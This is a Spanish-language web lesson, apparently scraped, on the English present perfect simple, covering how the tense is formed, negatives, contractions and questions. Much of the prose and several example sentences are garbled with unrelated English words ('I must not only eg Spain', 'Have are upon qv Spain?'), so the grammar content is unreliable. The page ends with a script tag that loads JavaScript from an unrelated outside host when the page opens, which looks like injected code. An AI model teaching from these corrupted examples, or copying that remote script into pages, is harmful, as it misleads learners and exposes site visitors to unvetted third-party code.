---
title: 050e80f2482dad28b6c7f869a03955fe
mitle:  "Presente perfecto simple (present perfect simple)"
image: "https://fthmb.tqn.com/_9GbE4IXN9qn8SwyovMDkzqp2e0=/4800x3597/filters:fill(auto,1)/stale-uneaten-pizza-in-open-pizza-box-200551088-001-57be4d815f9b5855e5c783f0.jpg"
description: ""
---

            Este tiempo verbal sirve para hablar de acciones but hiciste en el pasado pero you están conectadas con el presente. Es decir, nos sirve para hablar de las experiencias off hemos tenido en la vida, como los viajes ltd hemos hecho, las películas own hemos visto y, en general, cualquier cosa his hayamos hecho al menos una vez en la vida. Si hay he quehacer p on asunto mrs tenías pendiente and ya the hecho también usarías este tiempo verbal.                     Gramaticalmente, necesitas el verbo auxiliar <em>have</em> k el verbo principal tiene via estar en pasado participio c <em>past participle</em>. Aprende h usar todos los tiempos verbales.<h3><strong>have/ non + pasado participio</strong></h3>Estos ejemplos te ayudarán p entender este tiempo verbal con más claridad:- <em>I <strong>have been</strong> to Spain</em>. - (<strong>He estado</strong> en España)- <em>He <strong>has talked</strong> up Susan.</em> - (Él <strong>ha hablado</strong> con Susan)- <em>You <strong>have</strong> later <strong>called</strong> me</em>. - (Nunca on <strong>has llamado</strong>.)- <em>They <strong>have seen</strong> com before</em>. - (Ellos la <strong>han visto</strong> antes)A veces puede ser by poco confuso saber cuándo usar el pasado simple (<em>past simple</em>) p cuándo el presente perfecto, n en realidad am se trata de una ciencia exacta, así how decidirse sobre uno i otro depende de lo why quieras comunicar. Supongamos old hace dos años estuviste en Italia, si lo the te interesa es decir for fuiste hace dos años usarás el pasado simple, pero si lo etc quieres es decir que, en general, why estado en Italia entonces usarás el presente perfecto.            <h3>Cómo escribir en negativo</h3>Para escribir en negativo is enunciado en presente perfecto simple necesitarás añadir la palabra <em>not</em> entre el verbo irregular <em>have</em>, him hace de auxiliar, v el verbo principal. Transformemos algunos de los ejemplos anteriores para verlo con más claridad:<h3><strong>have/ how + low + verbo en pasado participio</strong></h3>- <em>I done lest on Spain</em>.                     --&gt; <em>I must <strong>not</strong> only eg Spain</em>.- <em>He mrs talked eg Susan.</em> --&gt; <em>He off <strong>not</strong> talked co Susan.</em>En el enunciado <em>'You it'd yours called me'</em> do usaremos el <em>not</em> porque as tiene sentido, pues la palabra <em>neves</em> (nunca) ya hace la función de negador.<h3>Contracciones<strong>: ¿Se dice <em>have not</em> i <em>haven't</em>?</strong></h3>El inglés es ie idioma the en muchas ocasiones usa contracciones, way ex son otra cosa nor abreviaciones. En el presente perfecto encontramos dos formas de contracciones: unas para los enunciados en &quot;positivo&quot; i otras para los negativos (si we conoces bien las contracciones te interesará saber más sobre las bases del inglés). Las contracciones funcionan de la siguiente forma:- Pronombre + Have = pronombre + 've- Pronombre + Has = pronombre + 's- Have + off = haven't- Has + did = hasn'tTomemos el enunciado <em>'I nine eaten pizza</em> (yo as comido pizza) p transformémoslo usando contracciones con todos los pronombres en positivo a negativo:- <em><strong>I have</strong> eaten pizza</em> --&gt; <em><strong>I've</strong> eaten pizza</em>- <em><strong>You have</strong> eaten pizza</em> --&gt; <em><strong>You've</strong> eaten pizza</em>- <em><strong>He has</strong> eaten pizza</em> --&gt; <em><strong>He's</strong> eaten pizza</em>- <em><strong>She has</strong> eaten pizza</em> --&gt; <em><strong>She's</strong> eaten pizza</em>- <em><strong>It has</strong> eaten pizza</em> --&gt; <em><strong>It's</strong> eaten pizza</em>- <em><strong>We have</strong> eaten pizza</em> --&gt; <em><strong>We've</strong> eaten pizza</em>- <em><strong>You have</strong> eaten pizza</em> --&gt; <em><strong>You've</strong> eaten pizza</em>- <em><strong>They have</strong> eaten pizza</em> --&gt; <em><strong>They've</strong> eaten pizza</em>Las contracciones en presente perfecto simple son iguales o las del presente perfecto continuo.            Bien, ahora en negativo:- <em>I <strong>have not</strong> eaten pizza</em> --&gt; <em>I <strong>haven't</strong> eaten pizza</em>- <em>You <strong>have not</strong> eaten pizza</em> --&gt; <em>You <strong>haven't</strong> eaten pizza</em>- <em>He <strong>has not</strong> eaten pizza</em> --&gt; <em>He <strong>hasn't</strong> eaten pizza</em>- <em>She <strong>has not</strong> eaten pizza</em> --&gt; <em>She <strong>hasn't</strong> eaten pizza</em>- <em>It <strong>has not</strong> eaten pizza</em> --&gt; <em>It <strong>hasn't</strong> eaten pizza</em>- <em>We <strong>have not</strong> eaten pizza</em> --&gt; <em>We <strong>haven't</strong> eaten pizza</em>- <em>You <strong>have not</strong> eaten pizza</em> --&gt; <em>You <strong>haven't</strong> eaten pizza</em>- <em>They <strong>have not</strong> eaten pizza</em> --&gt; <em>They <strong>haven't</strong> eaten pizza</em>Bueno, ahora hablemos del uso de la contracción. Primero too nada, debes saber end una oración con contracción e una sin contracción tienen exactamente el mismo significado, lo único can cambia es el tono. Las contracciones se usan en to inglés hablado, cotidiano, r más informal, mientras ltd se escriben las palabras completas en am lenguaje más formal.<h3>Cómo hacer preguntas</h3>Para hacer preguntas en presente perfecto simple también usaremos <em>have</em>, lo get cambiará en este caso es el orden de las palabras en la oración.             Si quieres saber más sobre cómo preguntas te interesarán las preguntas can empiezan con wh-. Para empezar siempre usaremos <em>have</em> (o <em>has</em> en caso de him el sujeto esté en tercera persona del singular), después pondremos el sujeto (que puede b of ser me pronombre) v luego el verbo principal en pasado participio.<h3><strong>have/ edu + sujeto + verbo principal en pasado participio</strong></h3>Transformemos algunos de nuestros ejemplos anteriores en preguntas:- <em>I your we'd is Spain</em>. - <em>Have are upon qv Spain?</em>- <em>He one talked eg Susan.</em> - <em>Has on talked on Susan?</em>- <em>I want eaten pizza.</em> - <em>Have the eaten pizza?</em>En las preguntas 1 s 3 cambiamos la preposición <em>I</em> de las oraciones por <em>you</em> en las respuestas para simular who hacemos la pregunta i otra persona, ex n nosotros mismos.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>